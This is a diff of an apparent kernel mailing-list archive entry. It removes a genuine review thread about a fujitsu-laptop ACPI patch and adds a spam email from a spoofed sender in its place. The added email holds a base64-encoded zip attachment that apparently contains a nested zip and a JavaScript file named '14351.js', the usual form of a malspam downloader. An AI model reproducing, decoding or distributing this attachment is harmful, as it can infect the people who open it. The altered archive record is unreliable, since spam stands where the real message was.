@@ -1,56 +1,79 @@
-From: Jonathan Woithe <jwoithe@just42.net>
-Subject: Re: [PATCH 5/7] platform/x86: fujitsu-laptop: do not update ACPI
- device power status
-Date: Fri, 23 Jun 2017 09:46:59 +0930
-Message-ID: <20170623001659.GF24368@marvin.atrad.com.au>
-References: <20170616044058.30443-1-kernel@kempniu.pl>
- <20170616044058.30443-6-kernel@kempniu.pl>
- <20170621201727.GC25900@fury>
- <20170622210235.GC4194@kmp-mobile.hq.kempniu.pl>
- <20170622235843.GC27213@fury>
+From: <horizon@qubeglobal.com>
+Subject: (unknown)
+Date: Fri, 23 Jun 2017 01:43:01 -0000
+Message-ID: <149818218106.29695.14646119526460022826@zaural.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
+Content-Type: application/zip; name="38089400225.zip"
+Content-Transfer-Encoding: base64
 Return-path: <platform-driver-x86-owner@vger.kernel.org>
-Received: from server.atrad.com.au ([150.101.241.2]:56574 "EHLO
-        server.atrad.com.au" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1753557AbdFWARd (ORCPT
+Received: from ws16.zone31-163-143.zaural.ru ([31.163.143.16]:52729 "HELO
+        zaural.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1753557AbdFWBnG (ORCPT
         <rfc822;platform-driver-x86@vger.kernel.org>);
-        Thu, 22 Jun 2017 20:17:33 -0400
-Content-Disposition: inline
-In-Reply-To: <20170622235843.GC27213@fury>
+        Thu, 22 Jun 2017 21:43:06 -0400
+Subject: 
+Content-Disposition: attachment
 Sender: platform-driver-x86-owner@vger.kernel.org
 List-ID: <platform-driver-x86.vger.kernel.org>
-To: Darren Hart <dvhart@infradead.org>
-Cc: Micha?? K??pie?? <kernel@kempniu.pl>, Andy Shevchenko <andy@infradead.org>, platform-driver-x86@vger.kernel.org, linux-acpi@vger.kernel.org, linux-kernel@vger.kernel.org
+To: platform-driver-x86@vger.kernel.org
 
-On Thu, Jun 22, 2017 at 04:58:43PM -0700, Darren Hart wrote:
-> On Thu, Jun 22, 2017 at 11:02:35PM +0200, Micha?? K??pie?? wrote:
-> > > On Fri, Jun 16, 2017 at 06:40:56AM +0200, Micha?? K??pie?? wrote:
-> > > > Calling acpi_bus_update_power() for ACPI devices FUJ02B1 and FUJ02E3 is
-> > > > pointless as they are not power manageable (neither _PS0 nor _PR0 is
-> > > > defined for any of them), which causes their power state to be inherited
-> > > > from their parent devices.  Given the ACPI paths of these two devices
-> > > > (\_SB.PCI0.LPCB.FJEX, \_SB.FEXT), their parent devices are also not
-> > > > power manageable.  These parent devices will thus have their power state
-> > > > initialized to ACPI_STATE_D0, which in turn causes the power state for
-> > > > both FUJ02B1 and FUJ02E3 to always be ACPI_STATE_D0 ("on").
-> > > > 
-> > > 
-> > > How confident are we that all implementations of these two ACPI devices lack
-> > > _PS0 and _PR0 ?
-> > 
-> > I looked at DSDT dumps of four different Fujitsu laptops released in the
-> > past ten years or so for which at least one of these two ACPI devices is
-> > present and found no traces of either of these methods being defined for
-> > them.  I do not think we have a way of ensuring that the above holds
-> > true for every other model out there, but I will point out that
-> > fujitsu-laptop is the only user of acpi_bus_update_power() outside of
-> > drivers/acpi.
-> 
-> OK, thanks. Queueing to testing.
-
-Thanks.  In case it was missed, I supplied my reviewed-by message and
-sign-off in an earlier post.
-
-Regards
-  jonathan
+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
